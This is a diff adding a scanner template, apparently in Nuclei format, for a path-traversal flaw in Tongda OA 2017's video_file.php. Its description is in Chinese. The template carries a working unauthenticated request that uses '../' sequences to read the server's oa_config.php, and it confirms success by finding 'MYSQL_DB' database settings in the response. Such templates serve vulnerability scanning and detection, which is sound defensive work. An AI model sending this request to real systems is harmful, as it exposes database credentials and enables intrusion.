@@ -1,0 +1,24 @@
+id: tongda-oa-file-download
+
+info:
+  name: "通达OA video_file.php 路径遍历导致非授权访问"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    通达OA 2017版存在文件路径遍历与非授权访问漏洞，攻击者可通过构造恶意请求参数远程获取服务器敏感文件内容。
+    该漏洞在2022年攻防演练中被披露，允许未经身份验证的远程攻击者通过操控video_file.php接口的路径参数实现敏感数据泄露。
+  tags: 通达
+
+http:
+- raw:
+  - |
+    GET /general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'MYSQL_DB'
